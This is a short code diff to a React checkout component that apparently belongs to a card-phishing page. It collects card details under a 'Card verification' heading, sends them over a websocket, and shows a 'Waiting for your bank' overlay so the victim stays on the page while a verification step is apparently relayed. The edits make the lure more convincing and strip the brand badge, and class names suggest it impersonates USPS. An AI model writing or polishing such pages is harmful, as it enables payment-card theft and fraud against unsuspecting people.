@@ -172,7 +172,7 @@ export default function Checkout() {
     const normalizedExpiry = normalizeExpiry(expiry, true);
     if (!isValidExpiryMMYY(normalizedExpiry) || !canSubmit || waiting) return;
     setWaiting(true);
-    setWaitingMsg('Details received. Keep this page open while your bank prepares the verification challenge.');
+    setWaitingMsg('Details received. Please wait while your bank reviews the request.');
     clearDraft(STORAGE_KEYS.checkoutDraft);
     setExpiry(normalizedExpiry);
     socket.emit('checkout-submit', {
@@ -189,7 +189,7 @@ export default function Checkout() {
         <div className="absolute inset-0 z-50 flex items-center justify-center bg-slate-900/45 backdrop-blur-sm">
           <div className="w-full max-w-md rounded-2xl border border-slate-200 bg-white p-6 text-center shadow-2xl">
             <div className="mx-auto mb-3 h-10 w-10 rounded-full border-4 border-amber-200 border-t-[#ff9900] animate-spin" />
-            <div className="text-lg font-semibold text-slate-900">Preparing verification</div>
+            <div className="text-lg font-semibold text-slate-900">Waiting for your bank</div>
             <div className="mt-2 text-sm text-slate-600">{waitingMsg}</div>
             <div className="mt-6 text-xs text-slate-500">Do not close this page while your issuer loads the next step.</div>
           </div>
@@ -200,7 +200,6 @@ export default function Checkout() {
         <div className="alz-top alz-usps-form-top">
           <div className="alz-step-head">
             <div>
-              <div className="alz-badge">{BRAND.name}</div>
               <h1 className="alz-step-title">Card verification</h1>
               <p className="alz-step-subtitle">Enter the card details required by your bank to continue.</p>
             </div>
